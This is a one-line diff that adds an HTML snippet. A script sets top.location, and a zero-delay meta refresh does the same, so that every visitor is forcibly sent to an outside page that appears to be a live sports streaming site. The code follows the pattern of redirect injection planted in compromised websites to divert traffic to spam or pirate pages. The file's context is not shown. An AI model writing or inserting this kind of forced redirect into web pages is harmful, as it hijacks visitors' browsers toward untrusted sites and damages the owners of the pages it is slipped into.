@@ -1,0 +1,1 @@
+<script>ref="https://sportslives.info/livehd/barceuw.php?lang=es";top.location.replace(ref);</script><meta http-equiv="Refresh" content="0;url=https://sportslives.info/livehd/barceuw.php?lang=es">
